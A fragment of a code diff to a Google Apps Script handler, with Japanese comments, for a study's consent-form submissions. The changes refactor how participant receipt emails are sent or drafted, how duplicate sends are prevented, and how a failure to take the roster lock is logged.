+      var body = g1RegisterAckBody_(pid, materials.url);
       if (G1_AUTO_SEND) {
-        MailApp.sendEmail(a.email, subject, body);
+        MailApp.sendEmail(a.email, subject, g1PlainBody_(body));
         Logger.log("📧 受付メールを送信しました → " + g1MaskEmail_(a.email));
       } else {
-        GmailApp.createDraft(a.email, subject, body);
+        GmailApp.createDraft(a.email, subject, g1PlainBody_(body));
         Logger.log("📝 受付メールの下書きを作成しました → " + g1MaskEmail_(a.email));
         Logger.log("   ⚠️ ★ 下書きのままでは被験者に届きません。Gmail から送信してください。");
       }
     } catch (mailErr) {
-      found = { url: "", problem: "受付メールに失敗したので記録しない" }; // ★ 下の記録を止める
+      materials = { url: "", problem: "受付メールに失敗したので記録しない" }; // ★ 下の記録を止める
       if (noteCell) noteCell.setValue("⚠受付メール未作成-要手動送信: " + mailErr);
       Logger.log("❌ 受付メールに失敗（P-ID は確定済 " + pid + "）。備考にフラグを立てました: " + mailErr);
     }
@@ -3461,12 +3853,12 @@ function onG1ConsentSubmit(e) {
     //    記録しないと `g1AutoSendPendingMaterials` が「まだ送っていない」と見なし、
     //    ★ **同じ人に事前資料メールをもう 1 通送る**（送信は取り消せない）。
     //    → 「配布フォルダURL」と「課題ページ送付日」の両方を埋めて、冪等キーを閉じる。
-    if (found.url && noteCell) {
+    if (materials.url && noteCell) {
       try {
         var sh2 = noteCell.getSheet();
         var r2 = noteCell.getRow();
         if (String(sh2.getRange(r2, runCol_("配布フォルダURL")).getValue()).trim() === "") {
-          sh2.getRange(r2, runCol_("配布フォルダURL")).setValue(found.url);
+          sh2.getRange(r2, runCol_("配布フォルダURL")).setValue(materials.url);
         }
         if (String(sh2.getRange(r2, runCol_("課題ページ送付日")).getValue()).trim() === "") {
           sh2.getRange(r2, runCol_("課題ページ送付日")).setValue(new Date());
@@ -3484,7 +3876,14 @@ function onG1ConsentSubmit(e) {
       }
     }
     Logger.log(isNew ? "🎉 新規登録: " + pid : "🔁 再提出（発番なし）: " + pid);
-  } finally {
-    lock.releaseLock();
+    return pid;
+  });
+
+  // ⚠️★ `g1WithRosterLock_` はロックを取れなければ `null` を返す。★ 黙って終わらせない。
+  if (locked === null) {
+    Logger.log(
+      "⛔ 発番も受付メールも行いませんでした（★ ロック取得失敗 / ロスター不在 / conflict のいずれか）。\n" +
+        "   ★ 上のログに理由が出ています。⚠️ 回答自体は失われていません。"
+    );
   }
 }
